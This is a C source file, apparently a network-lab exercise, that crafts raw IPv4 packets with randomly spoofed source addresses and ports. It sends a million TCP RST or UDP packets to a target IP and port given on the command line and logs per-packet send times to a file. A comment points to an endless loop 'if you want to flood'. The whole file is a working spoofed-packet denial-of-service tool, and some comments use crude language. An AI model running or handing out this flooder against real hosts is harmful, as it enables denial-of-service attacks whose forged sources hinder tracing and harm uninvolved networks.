/*
	Raw UDP sockets
*/
#include <stdio.h>       //for printf
#include <string.h>      //memset
#include <sys/socket.h>  //for socket
#include <stdlib.h>      //for exit(0);
#include <errno.h>       //For errno - the error number
#include <netinet/udp.h> //Provides declarations for udp header
#include <netinet/tcp.h> //Provides declarations for tcp header
#include <netinet/ip.h>  //Provides declarations for ip header
#include <arpa/inet.h>   // for inet_pton
#include <time.h>
#include <unistd.h> //for close socket

/* 
	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t length;
};

/*
    checksum calculation function
*/
unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((__u_char *)&oddbyte) = *(__u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

void random_address(char source_ip[])
{
    char tmp[4];
    int r = (rand() % 255) + 1; //select number between 1-255 - dont wont 0 at the beginning
    sprintf(tmp, "%d", r);
    strcat(tmp, ".");
    strcat(source_ip, tmp);
    for (size_t i = 0; i < 3; i++)
    {
        r = rand() % 256;
        sprintf(tmp, "%d", r);
        if (i != 2)
            strcat(tmp, ".");
        strcat(source_ip, tmp);
    }
}

int random_port()
{
    int r = rand() % 65354;
    return r;
}

void argument_handle(int argc, char *argv[], int *udp, char dest_ip[], int *port)
{

    size_t optind;
    for (optind = 1; optind < argc && argv[optind][0] == '-'; optind++)
    {
        switch (argv[optind][1])
        {
        case 't':
            if (argc <= optind + 1)
            {
                fprintf(stderr, "not enough arguments\n");
                exit(1);
            }
            strcpy(dest_ip, argv[optind + 1]);
            optind++;
            break;
        case 'p':
            if (argc <= optind + 1)
            {
                fprintf(stderr, "not enough arguments\n");
                exit(1);
            }
            *port = atoi(argv[optind + 1]);
            optind++;
            break;
        case 'r':
            *udp = 1;
            break;
        default:
            fprintf(stderr, "ERROR! please insert the right options\n");
            exit(1);
        }
    }
}

int main(int argc, char *argv[])
{
    srand(time(NULL)); // initialization of random
    char dest_ip[32];
    strncpy(dest_ip, "127.0.0.1", 10);
    int udp = 0, port = 443;
    argument_handle(argc, argv, &udp, dest_ip, &port); // adjust the right arguments from the commend line

    //Datagram to represent the packet
    char datagram[4096], source_ip[32], *data, *pseudogram;

    struct udphdr *udph;
    struct tcphdr *tcph;

    int count = 0;
    // 2 different loops if you want to flood - first to infinity , second to 1000 packets
    //while (1)

    FILE *fp;
    fp = fopen("syns_results_c.txt", "a+");
    if (fp == NULL) return -1;
    int index =0 ; 
    for(int i=0;i<100;i++){
        for(int j=0;j<10000;j++){
            index +=1;
    // while (count < 1000)
    // {
            //Create a raw socket of type IPPROTO
            int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

            if (s == -1)
            {
                perror("Failed to create raw socket");
                exit(1);
            }

            //zero out the packet buffer and source ip
            memset(datagram, 0, 4096);
            memset(source_ip, 0, 32);

            //IP header
            struct iphdr *iph = (struct iphdr *)datagram;

            struct pseudo_header psh; // for checksum calculation

            struct sockaddr_in sin;
            sin.sin_family = AF_INET;
            sin.sin_port = htons(port); //made destination port
            if (inet_pton(AF_INET, dest_ip, &(sin.sin_addr.s_addr)) <= 0)
            {
                fprintf(stderr, "inet_pton() failed for dest-ip with error");
                exit(-1);
            }
            if (udp)
            {
                //UDP header
                udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
                //Data part
                data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
            }

            else
            {
                //TCP header
                tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
                //Data part
                data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
            }

            strcpy(data, "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"); // garbage massage

            random_address(source_ip); // choose random ip number

            //Fill in the IP Header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            if (udp)
            {
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
                iph->protocol = IPPROTO_UDP; //raping upd datagram
            }
            else
            {
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
                iph->protocol = IPPROTO_TCP; //raping upd datagram
            }
            iph->id = htonl(1234); //Id of this packet
            iph->frag_off = 0;
            iph->ttl = 255;
            iph->check = 0; //Set to 0 before calculating checksum
            if (inet_pton(AF_INET, source_ip, &(iph->saddr)) <= 0)
            {
                fprintf(stderr, "inet_pton() failed for source-ip with error:");
                exit(-1);
            }

            iph->daddr = sin.sin_addr.s_addr;

            //Ip checksum
            iph->check = csum((unsigned short *)datagram, iph->tot_len);

            //UDP header
            int my_port = random_port();
            if (udp)
            {
                udph->source = htons(my_port);
                udph->dest = htons(port);
                udph->len = htons(8 + strlen(data)); //tcp header size
                udph->check = 0;                     //leave checksum 0 now, filled later by pseudo header
            }
            else
            {
                //TCP Header
                tcph->source = htons(my_port);
                tcph->dest = htons(port);
                tcph->seq = 0;
                tcph->ack_seq = 0;
                tcph->doff = 5; //tcp header size
                tcph->fin = 0;
                tcph->syn = 0;
                tcph->rst = 1; //reset bit on
                tcph->psh = 0;
                tcph->ack = 0;
                tcph->urg = 0;
                tcph->window = htons(5840); /* maximum allowed window size */
                tcph->check = 0;            //leave checksum 0 now, filled later by pseudo header
                tcph->urg_ptr = 0;
            }

            //Now the UDP checksum using the pseudo header
            psh.source_address = inet_addr(source_ip);
            psh.dest_address = sin.sin_addr.s_addr;
            psh.placeholder = 0;
            int psize;
            if (udp)
            {
                psh.protocol = IPPROTO_UDP;
                psh.length = htons(sizeof(struct udphdr) + strlen(data));

                psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
                pseudogram = malloc(psize);

                memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));

                udph->check = csum((unsigned short *)pseudogram, psize);
            }
            else
            {
                psh.protocol = IPPROTO_TCP;
                psh.length = htons(sizeof(struct tcphdr) + strlen(data));

                psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
                pseudogram = malloc(psize);

                memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

                tcph->check = csum((unsigned short *)pseudogram, psize);
            }

            //Send the packet
            clock_t t;
            t = clock();
            int res = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
            t = clock() - t;
            if (res < 0)
            {
                perror("sendto failed");
            }
            //Data send successfully
            else
            {
                //printf("Packet Send. Length : %d \n", iph->tot_len);
                double time_taken = 1000*((double)t)/CLOCKS_PER_SEC;
                // printf("time=%f \n", time_taken);
                fprintf(fp, "%d,%f\n",index,time_taken);
            }
            // count++;
            close(s);    
        }
    }
    free(pseudogram);
    fclose(fp);
    return 0;
}
